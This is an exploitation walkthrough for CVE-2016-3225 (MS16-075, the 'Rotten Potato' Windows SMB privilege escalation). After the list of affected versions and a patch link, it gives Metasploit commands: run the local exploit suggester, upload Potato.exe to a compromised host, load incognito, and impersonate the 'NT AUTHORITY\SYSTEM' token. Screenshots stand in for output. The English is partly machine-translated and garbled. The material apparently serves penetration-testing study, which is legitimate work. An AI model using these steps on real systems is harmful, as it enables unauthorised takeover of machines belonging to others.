### CVE-2016-3225

#### Describe

The SMB server component in Microsoft Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT 8.1, and Windows 10 Gold and 1511 allows local users to gain privileges via a crafted application that forwards an authentication request to an unintended service, aka "Windows SMB Server Elevation of Privilege Vulnerability."


#### ImpactVersion

| Product             | CPU Architecture | Version | Update | Tested             |
| ------------------- | ---------------- | ------- | ------ | ------------------ |
| Windows 10          | x86/x64          |         |        |                    |
| Windows 10          | x86/x64          | 1511    |        |                    |
| Windows 7           | x86/x64          |         | SP1    | &#10004; |
| Windows 8.1         | x86/x64          |         |        |                    |
| Windows Rt 8.1      |                  |         |        |                    |
| Windows Server 2008 | x86/x64          |         | SP2    |                    |
| Windows Server 2008 | x86/x64          | R2      | SP1    |                    |
| Windows Server 2012 |                  |         |        |                    |
| Windows Server 2012 |                  | R2      |        |                    |
| Windows Vista       |                  |         | SP2    |                    |

#### Patch

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2016-3225
```

#### Utilization

> Note: You need to run the MSF to generate files with administrator privileges to raise to SYSTEM permissions.

Windows 7 SP1 x64测试中，use `whoami /priv` Command View Discovery None **SeiMpersonateprivilege** Privilege Potato Right requires this privilege to turn on, so use administrator privileges when testing

![image-20200819140202765](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2016-3225_win7_x64.png)

Use MSF + rotten potatoes，First we assume that the machine has been launched, through the plugins from the MSF to identify the EXP you can take advantage of the current system to carry out rights

```
use multi/recon/local_exploit_suggester
set session 1 #Current machine session
run
```

If you do not run the MSF generated EXE, the script test is like this.

![image-20200819112155945](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2016-3225_win7_x64_msf_1.png)

If you use the administrator privilege to run, you can see more than the above MS16_075.

![image-20200819140819782](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2016-3225_win7_x64_msf_2.png)

Compiling the files of bad potatoes

```
potato.exe
```

Then upload compilation files

```
upload /Users/ascotbe/Downloads/Potato.exe C:/Users/ascotbe #上传potato.exe到目标机器中的C:\Users\ascotbe目录下,msf无法识别\符号所以必须使用/符号
```

Then execute the following commands will be successful.

```
use incognito #加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)
list_tokens -u #列出目标主机用户的可用令牌
execute -cH -f C:/Users/ascotbe/potato.exe #创建新的进程
list_tokens -u #列出目标主机用户的可用令牌
impersonate_token "NT AUTHORITY\SYSTEM"#假冒目标主机上的可用令牌
```

![image-20200819141240274](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2016-3225_win7_x64_msf_3.png)

Enter the Shell View

![image-20200819141337651](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2016-3225_win7_x64_msf_4.png)

> Second utilization

CompilerEnvironment

- VS2019（V141）X64 Release

Since there is no **Seimpersonateprivilege** privilege, this is demonstrated by the administrator account, using the program **potatoNG.exe** directly GIF map

![4](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2016-3225_win7_x64.gif)

